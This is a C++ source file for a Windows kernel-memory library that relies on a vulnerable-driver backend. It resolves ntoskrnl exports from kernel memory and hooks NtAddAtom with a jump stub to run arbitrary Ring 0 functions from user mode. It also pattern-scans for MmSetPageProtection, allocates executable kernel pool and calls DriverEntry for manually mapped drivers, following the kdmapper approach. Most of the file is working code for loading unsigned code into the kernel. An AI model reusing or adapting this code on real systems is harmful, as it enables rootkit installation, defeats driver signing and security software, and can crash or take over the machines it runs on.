#include "hinv_kmem.hpp"
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <psapi.h>
#include <vector>
#include <cwctype>
#include <algorithm>
#include <cstring>
#include <iostream>
#include <mutex>
#include <cstdlib>
#include <cstdio>

// MinGW does not expose these in winternl.h by default.
#ifndef SystemModuleInformation
#define SystemModuleInformation 11
#endif

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

#ifdef _MSC_VER
#pragma comment(lib, "ntdll.lib") // CMake links ntdll for other toolchains
#endif

namespace hinv {
namespace kmem {

static std::wstring ToLower(std::wstring s) {
    std::transform(s.begin(), s.end(), s.begin(), ::towlower);
    return s;
}

// ---------------------------------------------------------------------------
// Module name normalization
// ---------------------------------------------------------------------------

std::wstring NormalizeModuleName(const std::string& moduleName) {
    std::wstring s(moduleName.begin(), moduleName.end());
    return NormalizeModuleName(s);
}

std::wstring NormalizeModuleName(const std::wstring& moduleName) {
    std::wstring s = ToLower(moduleName);

    // Strip path.
    size_t slash = s.find_last_of(L"\\/");
    if (slash != std::wstring::npos) s = s.substr(slash + 1);

    // Strip extension for matching, then map known aliases.
    size_t dot = s.find(L'.');
    std::wstring stem = (dot != std::wstring::npos) ? s.substr(0, dot) : s;

    if (stem == L"ntoskrnl" || stem == L"ntkrnlpa" || stem == L"ntkrnlmp") return L"ntoskrnl.exe";
    if (stem == L"hal") return L"hal.dll";
    if (stem == L"fltmgr") return L"fltmgr.sys";
    if (stem == L"kdcom") return L"kdcom.dll";
    if (stem == L"ndis") return L"ndis.sys";
    if (stem == L"tcpip") return L"tcpip.sys";
    if (stem == L"win32k") return L"win32k.sys";
    if (stem == L"ci") return L"ci.dll";
    if (stem == L"clfs") return L"clfs.sys";

    // Default: assume .sys for kernel modules without extension.
    if (dot == std::wstring::npos) return stem + L".sys";
    return s;
}

// ---------------------------------------------------------------------------
// Module enumeration
// ---------------------------------------------------------------------------

using NtQuerySystemInformationFn = NTSTATUS(NTAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

std::vector<KernelModule> EnumKernelModules() {
    std::vector<KernelModule> result;
    auto NtQuerySystemInformation = reinterpret_cast<NtQuerySystemInformationFn>(reinterpret_cast<void*>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation")));
    if (!NtQuerySystemInformation) return result;

    ULONG size = 0;
    NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &size);
    if (size == 0) return result;

    std::vector<uint8_t> buffer(size);
    if (!NT_SUCCESS(NtQuerySystemInformation(SystemModuleInformation, buffer.data(), size, &size)))
        return result;

    auto* info = reinterpret_cast<RTL_PROCESS_MODULES*>(buffer.data());
    for (ULONG i = 0; i < info->NumberOfModules; ++i) {
        const auto& m = info->Modules[i];
        KernelModule km;
        km.base = reinterpret_cast<uint64_t>(m.ImageBase);
        km.size = m.ImageSize;
        std::string asciiName(reinterpret_cast<const char*>(m.FullPathName));
        km.name.assign(asciiName.begin(), asciiName.end());
        // Keep only the file name for display; base/size are what matter.
        size_t slash = km.name.find_last_of(L"\\/");
        if (slash != std::wstring::npos) km.name = km.name.substr(slash + 1);
        result.push_back(km);
    }
    return result;
}

// ---------------------------------------------------------------------------
// Kernel export resolution
// ---------------------------------------------------------------------------

uint64_t GetKernelExport(byovd::IByovdBackend* backend, uint64_t moduleBase, const char* exportName) {
    if (!backend || !moduleBase || !exportName) return 0;

    IMAGE_DOS_HEADER dos{};
    if (!backend->ReadKernelMemory(moduleBase, &dos, sizeof(dos))) return 0;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS64 nt{};
    if (!backend->ReadKernelMemory(moduleBase + dos.e_lfanew, &nt, sizeof(nt))) return 0;
    if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    const auto& exportDir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.VirtualAddress == 0 || exportDir.Size == 0) return 0;

    IMAGE_EXPORT_DIRECTORY expDir{};
    if (!backend->ReadKernelMemory(moduleBase + exportDir.VirtualAddress, &expDir, sizeof(expDir))) return 0;

    std::vector<uint32_t> rvas(expDir.NumberOfNames);
    std::vector<uint16_t> ords(expDir.NumberOfNames);
    std::vector<uint32_t> funcs(expDir.NumberOfFunctions);

    if (!backend->ReadKernelMemory(moduleBase + expDir.AddressOfNames, rvas.data(), rvas.size() * sizeof(uint32_t)))
        return 0;
    if (!backend->ReadKernelMemory(moduleBase + expDir.AddressOfNameOrdinals, ords.data(), ords.size() * sizeof(uint16_t)))
        return 0;
    if (!backend->ReadKernelMemory(moduleBase + expDir.AddressOfFunctions, funcs.data(), funcs.size() * sizeof(uint32_t)))
        return 0;

    for (uint32_t i = 0; i < expDir.NumberOfNames; ++i) {
        char name[256]{};
        if (!backend->ReadKernelMemory(moduleBase + rvas[i], name, sizeof(name) - 1)) continue;
        if (std::strcmp(name, exportName) == 0) {
            uint16_t ord = ords[i];
            if (ord < expDir.NumberOfFunctions) {
                return moduleBase + funcs[ord];
            }
        }
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Process-local registry of manually mapped modules
// ---------------------------------------------------------------------------

static std::mutex g_mappedModulesMutex;
static std::vector<MappedModule> g_mappedModules;

void RegisterMappedModule(const std::wstring& moduleName, uint64_t base, uint32_t size) {
    if (moduleName.empty() || !base || !size) return;

    std::wstring name = ToLower(moduleName);
    size_t slash = name.find_last_of(L"\\/");
    if (slash != std::wstring::npos) name = name.substr(slash + 1);

    std::lock_guard<std::mutex> lock(g_mappedModulesMutex);
    for (auto& m : g_mappedModules) {
        if (m.name == name) {
            m.base = base;
            m.size = size;
            return;
        }
    }
    g_mappedModules.push_back({ name, base, size });
}

// Returns the base of a registered mapped module, or 0. lowerName must
// already be lowercase file stem + extension (e.g. L"hyperhv.dll").
static uint64_t FindMappedModule(const std::wstring& lowerName) {
    std::lock_guard<std::mutex> lock(g_mappedModulesMutex);
    for (const auto& m : g_mappedModules) {
        if (m.name == lowerName) return m.base;
    }
    return 0;
}

uint64_t ResolveKernelExport(byovd::IByovdBackend* backend, const wchar_t* moduleName, const char* exportName) {
    std::wstring target = ToLower(moduleName);

    // Manually mapped modules never appear in PsLoadedModuleList; check the
    // process-local registry first. GetKernelExport parses the export table
    // from kernel memory through the backend, which works because the mapped
    // image retains its PE headers.
    uint64_t mappedBase = FindMappedModule(target);
    if (mappedBase) return GetKernelExport(backend, mappedBase, exportName);

    auto mods = EnumKernelModules();
    for (const auto& m : mods) {
        if (ToLower(m.name) == target) {
            return GetKernelExport(backend, m.base, exportName);
        }
    }
    return 0;
}

// ---------------------------------------------------------------------------
// OS version detection
// ---------------------------------------------------------------------------

OsVersionInfo GetOsVersion() {
    OsVersionInfo info{};
    using RtlGetVersionFn = NTSTATUS(NTAPI*)(PRTL_OSVERSIONINFOW);
    auto RtlGetVersion = reinterpret_cast<RtlGetVersionFn>(reinterpret_cast<void*>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion")));
    if (RtlGetVersion) {
        RTL_OSVERSIONINFOW os{};
        os.dwOSVersionInfoSize = sizeof(os);
        if (NT_SUCCESS(RtlGetVersion(&os))) {
            info.major = os.dwMajorVersion;
            info.minor = os.dwMinorVersion;
            info.build = os.dwBuildNumber;
            info.revision = os.dwPlatformId; // not revision; kept for compatibility
        }
    }
    return info;
}

// ---------------------------------------------------------------------------
// Arbitrary kernel function calls (kdmapper-style NtAddAtom hook)
// ---------------------------------------------------------------------------
//
// Replaces the old HalDispatchTable shellcode machinery (which needed the
// randomized PTE self-reference index and bugchecked this machine three
// times). Instead, we overwrite the first bytes of ntoskrnl!NtAddAtom with
// `mov rax, target; jmp rax` through the backend's read-only write primitive
// (physical mapping on the Intel backend), then invoke ntdll!NtAddAtom from
// usermode: the syscall lands in our hook with the original argument
// registers, so the target runs in Ring 0 with our args and its return value
// comes back in RAX. The prologue is always restored.

void Trace(const char* stage) {
    static const std::string path = [] {
        const char* p = std::getenv("HINV_TRACE");
        return p ? std::string(p) : std::string();
    }();
    if (path.empty()) return;
    if (FILE* f = std::fopen(path.c_str(), "ab")) {
        std::fprintf(f, "%s\n", stage);
        std::fclose(f); // close == flush: survives a bugcheck
    }
}

namespace detail {

static uint64_t KernelNtAddAtom(byovd::IByovdBackend* backend) {
    static uint64_t cached = 0;
    if (!cached) cached = ResolveKernelExport(backend, L"ntoskrnl.exe", "NtAddAtom");
    return cached;
}

void* UserNtAddAtom() {
    return reinterpret_cast<void*>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAddAtom"));
}

bool InstallCallHook(byovd::IByovdBackend* backend, uint64_t target, uint8_t (&original)[12]) {
    Trace("kmem: hook install begin");
    uint64_t ntAddAtom = KernelNtAddAtom(backend);
    if (!ntAddAtom || !UserNtAddAtom()) { Trace("kmem: hook install failed (resolve)"); return false; }

    if (!backend->ReadKernelMemory(ntAddAtom, original, 12)) { Trace("kmem: hook install failed (read)"); return false; }

    uint8_t stub[12] = { 0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0xFF, 0xE0 };
    std::memcpy(stub + 2, &target, 8);
    bool ok = backend->WriteReadOnlyMemory(ntAddAtom, stub, sizeof(stub));
    Trace(ok ? "kmem: hook installed" : "kmem: hook install failed (write)");
    return ok;
}

bool RemoveCallHook(byovd::IByovdBackend* backend, const uint8_t (&original)[12]) {
    Trace("kmem: hook remove begin");
    uint64_t ntAddAtom = KernelNtAddAtom(backend);
    if (!ntAddAtom) return false;
    bool ok = backend->WriteReadOnlyMemory(ntAddAtom, original, 12);
    Trace(ok ? "kmem: hook removed" : "kmem: hook remove failed");
    return ok;
}

} // namespace detail

// ---------------------------------------------------------------------------
// Kernel pattern scanning (in-image reads only — always safe through the
// backend because every byte of a loaded module's image is resident/mapped)
// ---------------------------------------------------------------------------

static uint64_t FindPatternInSectionKernel(byovd::IByovdBackend* backend, uint64_t moduleBase,
                                           const char* sectionName,
                                           const std::vector<uint8_t>& pattern,
                                           const std::vector<bool>& mask) {
    if (!backend || pattern.empty() || pattern.size() != mask.size()) return 0;

    IMAGE_DOS_HEADER dos{};
    if (!backend->ReadKernelMemory(moduleBase, &dos, sizeof(dos))) return 0;
    IMAGE_NT_HEADERS64 nt{};
    if (!backend->ReadKernelMemory(moduleBase + dos.e_lfanew, &nt, sizeof(nt))) return 0;

    uint16_t numSections = nt.FileHeader.NumberOfSections;
    std::vector<IMAGE_SECTION_HEADER> sections(numSections);
    uint64_t sectionTable = moduleBase + dos.e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader;
    if (!backend->ReadKernelMemory(sectionTable, sections.data(), numSections * sizeof(IMAGE_SECTION_HEADER))) return 0;

    uint64_t secVa = 0;
    uint32_t secSize = 0;
    for (const auto& sec : sections) {
        if (std::strncmp(reinterpret_cast<const char*>(sec.Name), sectionName, IMAGE_SIZEOF_SHORT_NAME) == 0) {
            secVa = moduleBase + sec.VirtualAddress;
            secSize = sec.Misc.VirtualSize;
            break;
        }
    }
    if (!secVa || !secSize) return 0;

    constexpr size_t CHUNK = 0x1000;
    std::vector<uint8_t> buffer(CHUNK + pattern.size());
    for (uint32_t off = 0; off < secSize; off += CHUNK) {
        uint32_t readSize = (off + CHUNK > secSize) ? (secSize - off) : CHUNK;
        readSize = static_cast<uint32_t>(readSize + pattern.size());
        if (off + readSize > secSize) readSize = secSize - off;
        if (!backend->ReadKernelMemory(secVa + off, buffer.data(), readSize)) continue;

        for (size_t i = 0; i + pattern.size() <= readSize; ++i) {
            bool match = true;
            for (size_t j = 0; j < pattern.size(); ++j) {
                if (mask[j] && buffer[i + j] != pattern[j]) { match = false; break; }
            }
            if (match) return secVa + off + i;
        }
    }
    return 0;
}

static uint64_t GetNtoskrnlBase() {
    for (const auto& m : EnumKernelModules()) {
        if (ToLower(m.name).find(L"ntoskrnl") != std::wstring::npos) return m.base;
    }
    return 0;
}

// MmSetPageProtection is documented since 1803 but not always exported. When
// the export is missing, recover it with kdmapper's PAGELK pattern: a
// `cmovcc + lea + call` sequence whose final E8 calls MmSetPageProtection.
static uint64_t ResolveMmSetPageProtection(byovd::IByovdBackend* backend) {
    static uint64_t cached = 0;
    if (cached) return cached;

    uint64_t addr = ResolveKernelExport(backend, L"ntoskrnl.exe", "MmSetPageProtection");
    if (addr) { cached = addr; return addr; }

    uint64_t ntosBase = GetNtoskrnlBase();
    if (!ntosBase) return 0;

    IMAGE_NT_HEADERS64 nt{};
    {
        IMAGE_DOS_HEADER dos{};
        if (!backend->ReadKernelMemory(ntosBase, &dos, sizeof(dos))) return 0;
        if (!backend->ReadKernelMemory(ntosBase + dos.e_lfanew, &nt, sizeof(nt))) return 0;
    }
    uint64_t imageEnd = ntosBase + nt.OptionalHeader.SizeOfImage;

    // Pattern 1: 0F 45 ?? ?? 8D ?? ?? ?? FF FF E8 — E8 sits at match+10.
    {
        std::vector<uint8_t> pat = { 0x0F, 0x45, 0x00, 0x00, 0x8D, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xE8 };
        std::vector<bool>   msk = { true, true, false, false, true, false, false, false, true, true, true };
        uint64_t m = FindPatternInSectionKernel(backend, ntosBase, "PAGELK", pat, msk);
        if (m) {
            int32_t rel = 0;
            if (ReadU32(backend, m + 11, reinterpret_cast<uint32_t&>(rel))) {
                uint64_t target = m + 10 + 5 + rel;
                if (target >= ntosBase && target < imageEnd) { cached = target; return target; }
            }
        }
    }

    // Pattern 2 (some builds keep an extra mov in the middle):
    // 0F 45 ?? ?? 45 8B ?? ?? ?? ?? 8D ?? ?? ?? ?? ?? ?? FF FF E8 — E8 at match+19.
    {
        std::vector<uint8_t> pat = { 0x0F, 0x45, 0x00, 0x00, 0x45, 0x8B, 0x00, 0x00, 0x00, 0x00,
                                     0x8D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xE8 };
        std::vector<bool>   msk = { true, true, false, false, true, true, false, false, false, false,
                                    true, false, false, false, false, false, false, true, true, true };
        uint64_t m = FindPatternInSectionKernel(backend, ntosBase, "PAGELK", pat, msk);
        if (m) {
            int32_t rel = 0;
            if (ReadU32(backend, m + 20, reinterpret_cast<uint32_t&>(rel))) {
                uint64_t target = m + 19 + 5 + rel;
                if (target >= ntosBase && target < imageEnd) { cached = target; return target; }
            }
        }
    }

    return 0;
}

// ---------------------------------------------------------------------------
// Kernel memory allocation / protection / driver entry
// ---------------------------------------------------------------------------

bool AllocateKernelMemory(byovd::IByovdBackend* backend, size_t size, uint64_t& outKernelVa) {
    if (!backend || size == 0) return false;

    // Same primitive kdmapper uses: ExAllocatePoolWithTag(NonPagedPool, ...).
    // The pool is NX on Win8+; callers that execute from it must flip
    // protection with ProtectKernelMemory.
    uint64_t allocFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "ExAllocatePoolWithTag");
    if (!allocFn) {
        std::cerr << "[hinv::kmem] ExAllocatePoolWithTag not found\n";
        return false;
    }

    constexpr uint64_t NonPagedPool = 0;
    constexpr uint64_t HinvTag = 0x766E6968; // 'hinv'
    uint64_t allocated = 0;
    if (!CallKernelFunction(backend, &allocated, allocFn, NonPagedPool,
                            static_cast<uint64_t>(size), HinvTag))
        return false;

    outKernelVa = allocated;
    return outKernelVa != 0;
}

bool FreeKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa) {
    if (!backend || !kernelVa) return false;

    uint64_t freeFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "ExFreePoolWithTag");
    if (!freeFn) {
        std::cerr << "[hinv::kmem] ExFreePoolWithTag not found\n";
        return false;
    }

    constexpr uint64_t HinvTag = 0x766E6968; // 'hinv'
    return CallKernelFunction<void>(backend, nullptr, freeFn, kernelVa, HinvTag);
}

bool ProtectKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa, size_t size, uint32_t protect) {
    if (!backend || !kernelVa || !size) return false;

    uint64_t setProtFn = ResolveMmSetPageProtection(backend);
    if (!setProtFn) {
        std::cerr << "[hinv::kmem] MmSetPageProtection not found\n";
        return false;
    }

    uint8_t ok = 0; // BOOLEAN
    if (!CallKernelFunction(backend, &ok, setProtFn, kernelVa,
                            static_cast<uint64_t>(size), static_cast<uint64_t>(protect)))
        return false;
    return ok != 0;
}

uint32_t CallDriverEntry(byovd::IByovdBackend* backend, uint64_t driverEntryVa,
                         uint64_t driverObjectVa, uint64_t registryPathVa) {
    if (!backend || !driverEntryVa) return STATUS_INVALID_PARAMETER;

    uint32_t status = STATUS_UNSUCCESSFUL;
    if (!CallKernelFunction(backend, &status, driverEntryVa, driverObjectVa, registryPathVa)) {
        std::cerr << "[hinv::kmem] CallDriverEntry: kernel call failed\n";
        return STATUS_UNSUCCESSFUL;
    }
    return status;
}

} // namespace kmem
} // namespace hinv
